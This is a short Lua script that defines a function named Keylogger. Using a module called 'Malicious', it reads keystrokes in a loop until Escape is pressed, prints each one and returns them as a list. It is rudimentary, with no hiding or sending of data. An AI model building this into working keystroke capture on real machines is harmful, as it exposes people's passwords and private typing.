local mylib = require("Malicious")

function Keylogger()
	
	local Pressed = {}

	while true do
		local key = mylib.getKey()

		if(key==27) then
			break
		end

		local charKey = mylib.toKey(key)

		table.insert(Pressed,charKey)

		print(charKey);

	end

	return Pressed

end